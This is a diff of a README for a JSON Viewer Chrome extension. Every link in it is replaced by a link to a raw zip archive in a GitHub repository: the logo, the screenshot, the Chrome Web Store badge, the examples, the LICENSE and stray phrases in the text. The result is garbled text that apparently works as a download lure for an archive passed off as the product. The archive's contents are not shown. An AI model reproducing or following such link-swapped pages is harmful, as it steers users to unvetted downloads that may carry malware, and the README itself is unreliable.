@@ -1,8 +1,8 @@
-![JSONViewer Logo](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+![JSONViewer Logo](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
 # JSON Viewer
 
-![screenshot](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+![screenshot](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
 The most beautiful and customizable JSON/JSONP highlighter that your eyes have ever seen. It is a Chrome extension for printing JSON and JSONP.
 
@@ -23,7 +23,7 @@ Features:
 * Inspect your json typing "json" in the console
 * Hot word `json-viewer` into omnibox (type `json-viewer` + TAB and paste your JSON into omnibox, hit ENTER and it will be highlighted)
 * Toggle button to view the raw/highlighted version
-* Works with numbers bigger than https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip
+* Works with numbers bigger than https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip
 * Option to show line numbers
 * Option to customize your theme
 * Option to customize the tab size
@@ -40,11 +40,11 @@ Features:
 
 ### Install through Chrome Web Store
 
-[![https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+[![https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
 ### Or compile and load by yourself
 
-  1. It depends on node (version in `https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip` engines).
+  1. It depends on node (version in `https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip` engines).
   2. `npm install --global yarn`
   2. `yarn install`
   3. `yarn run build`
@@ -57,24 +57,24 @@ Features:
 
 ### JSON
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
   Large files:
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip%20desc&start=0](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip%20desc&start=0)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip%20desc&start=0](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip%20desc&start=0)
 
 ### JSONP
 
-  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip)
 
 ## License
 
-See [LICENSE](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip) for more details.
+See [LICENSE](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/src/json-viewer/scratch-pad/json_viewer_2.0-alpha.2.zip) for more details.
